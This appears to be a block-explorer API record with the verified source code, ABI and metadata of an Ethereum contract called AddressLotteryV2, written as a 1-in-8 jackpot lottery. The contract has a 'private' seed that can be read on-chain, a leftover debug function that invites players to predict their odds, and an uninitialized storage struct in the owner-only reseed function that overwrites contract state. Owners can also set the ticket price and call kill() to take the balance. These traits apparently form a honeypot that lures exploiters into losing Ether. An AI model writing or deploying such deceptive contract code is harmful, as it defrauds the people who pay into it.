{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.0;\r\n/*\r\n * This is a distributed lottery that chooses random addresses as lucky addresses. If these\r\n * participate, they get the jackpot: the whole balance of the contract, including the ticket\r\n * price. Of course one address can only win once. The owner regularly reseeds the secret\r\n * seed of the contract (based on which the lucky addresses are chosen), so if you did not win,\r\n * just wait for a reseed and try again! Contract addresses cannot play for obvious reasons.\r\n *\r\n * Jackpot chance:   1 in 8\r\n*/\r\ncontract AddressLotteryV2{\r\n    struct SeedComponents{\r\n        uint component1;\r\n        uint component2;\r\n        uint component3;\r\n        uint component4;\r\n    }\r\n    \r\n    address owner;\r\n    uint private secretSeed;\r\n    uint private lastReseed;\r\n    \r\n    uint winnerLuckyNumber = 7;\r\n    \r\n    uint public ticketPrice = 1 ether;\r\n        \r\n    address owner2;\r\n        \r\n    mapping (address => bool) participated;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner||msg.sender==owner2);\r\n        _;\r\n    }\r\n  \r\n    modifier onlyHuman() {\r\n        require(msg.sender == tx.origin);\r\n        _;\r\n    }\r\n    \r\n    function AddressLotteryV2(address _owner2) {\r\n        owner = msg.sender;\r\n        owner2 = _owner2;\r\n        reseed(SeedComponents(12345678, 0x12345678, 0xabbaeddaacdc, 0x22222222));\r\n    }\r\n    \r\n    function setTicketPrice(uint newPrice) onlyOwner {\r\n        ticketPrice = newPrice;\r\n    }\r\n    \r\n    function participate() payable onlyHuman { \r\n        require(msg.value >= ticketPrice);\r\n        \r\n        // every address can only win once, obviously\r\n        if(!participated[msg.sender]){\r\n        \r\n        if ( luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)\r\n        {\r\n            participated[msg.sender] = true;\r\n            require(msg.sender.call.value(this.balance)());\r\n        }\r\n            \r\n        }\r\n    }\r\n    \r\n    function luckyNumberOfAddress(address addr) constant returns(uint n){\r\n        // 1 in 8 chance\r\n        n = uint(keccak256(uint(addr), secretSeed)[0]) % 8;\r\n    }\r\n    \r\n    function reseed(SeedComponents components) internal{\r\n        secretSeed = uint256(keccak256(\r\n            components.component1,\r\n            components.component2,\r\n            components.component3,\r\n            components.component4\r\n        ));\r\n        lastReseed = block.number;\r\n    }\r\n    \r\n    function kill() onlyOwner {\r\n        suicide(owner);\r\n    }\r\n    \r\n    function forceReseed() onlyOwner{\r\n        SeedComponents s;\r\n        s.component1 = uint(owner);\r\n        s.component2 = uint256(block.blockhash(block.number - 1));\r\n        s.component3 = block.number * 1337;\r\n        s.component4 = tx.gasprice * 7;\r\n        reseed(s);\r\n    }\r\n    \r\n    function () payable {}\r\n    \r\n    // DEBUG, DELETE BEFORE DEPLOYMENT!!\r\n    function _myLuckyNumber() constant returns(uint n){\r\n        n = luckyNumberOfAddress(msg.sender);\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"ticketPrice\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newPrice\",\"type\":\"uint256\"}],\"name\":\"setTicketPrice\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"luckyNumberOfAddress\",\"outputs\":[{\"name\":\"n\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_myLuckyNumber\",\"outputs\":[{\"name\":\"n\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"forceReseed\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"participate\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_owner2\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"AddressLotteryV2","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"00000000000000000000000062cd791016478a16a75c82ea0c6f13136f8d7e62","Library":"","SwarmSource":"bzzr://44a74c17c2ea57af8b41d00ea8572fd8918d5c40b21225e20ed47c790fb0462d"}]}